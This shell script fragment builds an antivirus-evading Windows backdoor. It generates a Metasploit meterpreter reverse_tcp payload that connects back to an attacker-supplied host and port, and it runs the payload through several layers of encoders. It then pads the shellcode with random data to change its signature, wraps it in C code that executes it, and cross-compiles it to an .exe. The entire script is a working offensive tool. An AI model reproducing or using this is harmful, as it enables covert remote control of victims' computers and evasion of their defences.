seed="8000"
items="15"
							
							echo  "[Wait] Generating and encoding payload....."
							
							msfpayload windows/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 EXITFUNC=thread R | msfencode -e x86/shikata_ga_nai -c $items -t raw | msfencode -e x86/jmp_call_additive -c $items -t raw | msfencode -e x86/call4_dword_xor -c $items -t raw |  msfencode -e x86/shikata_ga_nai -c $items >payload.c
							echo ""
							echo  "[wait] Please wait, this will take some time...."
							
							
							sed -e 's/+/ /g' payload.c > clean.c
							sed -e 's/buf = /unsigned char micro[]=/g' clean.c > ready.c
							echo "#include <stdio.h>" >> temp
							echo 'unsigned char ufs[]=' >> temp
							for i in $(seq 1 9999999)
                           do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp1
							sed -i 's/$/"/' temp1
							sed -i 's/^/"/' temp1
							echo  ';' >> temp1
							cat temp1 >> temp
							cat ready.c >> temp
							mv temp ready1.c
							echo ";" >> ready1.c
							echo "int main(void) { ((void (*)())micro)();}" >> ready1.c  
							mv ready1.c final.c
							echo 'unsigned char tap[]=' > temp2
							for i in $(seq 1 9999999)
                                do echo $RANDOM $i; done | sort -k1| cut -d " " -f2| head -$seed >> temp3
							sed -i 's/$/"/' temp3
							sed -i 's/^/"/' temp3
							echo  ';' >> temp3
							cat temp3 >> temp2
							cat temp2 >> final.c
							echo "[ ok ] Custom shell has created"
							i586-mingw32msvc-gcc -Wall final.c -o final.exe > /dev/null 2>&1
							echo "[ ok ]Payload Successfully generated "
							mv final.exe $3
rm clean.c ready.c final.c  payload.c temp1 temp2 temp3							
						
